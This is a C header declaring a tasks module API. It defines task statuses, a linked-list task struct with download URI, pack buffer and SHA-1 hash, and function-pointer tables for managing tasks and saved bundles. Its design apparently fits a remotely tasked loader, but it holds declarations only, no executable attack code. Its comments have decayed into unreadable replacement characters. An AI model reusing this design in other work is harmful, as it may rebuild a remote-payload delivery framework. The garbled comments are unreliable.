#ifndef __MOD_TASKSAPI_H_
#define __MOD_TASKSAPI_H_

#include "../../mod_shared/pack_protect.h"

typedef enum
{
    TS_Obtained = 0,    // ������� ��������.
    TS_Completed,       // ������� ���������� �������.
    TS_Rejected,        // ������� �� �������� ����.
    TS_InternalError,   // ���������� ������.
    TS_InvalidSign,     // �� ������ ���������.
    TS_HashError,       // ��� ����� �� ��������.
    TS_DecompressError, // ������ ��� ����������.
    TS_SaveError,       // �� ������� ��������� �� ����.
} task_status_e;


typedef struct _task
{
    struct _task* pNext;    // ��������� �� ��������� �������.
    uint32_t id;            // ���������� ID ��� �������, ������� ������ ������������ ������� ������� � ����� ������.
    uint32_t groupId;       // ���������� ID ������, ������� ����������� ������ �������. ������ ������������ ���������� � ������.
    uint8_t status;         // ��������� ���������� �������.
    char* uri;              // URI ��� �������� �����.
    char* filter;           // Raw-������ ��� �������.
    uint8_t* packBuffer;    // ����������� ���, ������� ����� ������� � ������ ����������� �������.
    uint32_t packSize;      // ������ ������������ ����.
    uint8_t sha1Hash[20];   // SHA-160 ��� ��� ��������� ����� (�������� ������������ �������).
} task_t, *ptask_t;

typedef bool_t (*Fntasks_filter_uint32_pair)(char** pItr, char* end, uint32_t realVal1, uint32_t realVal2);
typedef bool_t (*Fntasks_filter_numeric)(char** pItr, char* end, uint64_t realVal);
typedef void (*Fntasks_filter)(ptask_t pTask);


typedef struct _mod_tasks_private
{
    Fntasks_filter_uint32_pair fntasks_filter_uint32_pair;
    Fntasks_filter_numeric fntasks_filter_numeric;
    Fntasks_filter fntasks_filter;

    ptask_t pTaskHead;
    uint8_t* pModBase;

    char biPath[8]; // Bundle's items path
} mod_tasks_private_t, *pmod_tasks_private_t;

// ������������ �������
typedef void (*Fntasks_shutdown_routine)();

/* ��������� ������� � ������. */
typedef void (*Fntasks_add_task)(ptask_t pTask);

/* ������� ������� �� ������. */
typedef void (*Fntasks_remove_all)();

/* ���������� ���������� ����������� ������� ( > TS_Accepted). */
typedef uint32_t (*Fntasks_get_completed_task_count)();

/* ���������� ��������� �� ������ ������� �� �������� TS_Accepted. */
typedef ptask_t (*Fntasks_get_next_obtained)(ptask_t pTask);

/* ��������� ������ ���������� <id><status> ��� ������� �� �������� TS_Completed. */
typedef void (*Fntasks_fill_with_completed)(pvoid_t* pVector, uint32_t* pSize);

/** ���������� ���� ������ � ���������. */
typedef ptask_t (*Fntasks_destroy)(ptask_t pTask);

typedef int (*Fntasks_save_bundle_entry)(pbundle_info_entry_t pBundleEntry);

typedef void (*Fntasks_load_bundle_entries)(pbundle_info_entry_t* pBundlesEntries, uint32_t* pCount);

typedef int (*Fntasks_save_bundle_entries)(pbundle_info_entry_t pBundlesItems, uint32_t count);

typedef struct _mod_tasks_block
{
    Fntasks_shutdown_routine fntasks_shutdown_routine;
    Fntasks_add_task fntasks_add_task;
    Fntasks_remove_all fntasks_remove_all;
    Fntasks_get_completed_task_count fntasks_get_completed_task_count;
    Fntasks_get_next_obtained fntasks_get_next_obtained;
    Fntasks_fill_with_completed fntasks_fill_with_completed;
    Fntasks_destroy fntasks_destroy;
    Fntasks_save_bundle_entry fntasks_save_bundle_entry;
    Fntasks_load_bundle_entries fntasks_load_bundle_entries;
    Fntasks_save_bundle_entries fntasks_save_bundle_entries;

    mod_tasks_private_t;
} mod_tasks_block_t, *pmod_tasks_block_t;

#endif // __MOD_TASKSAPI_H_
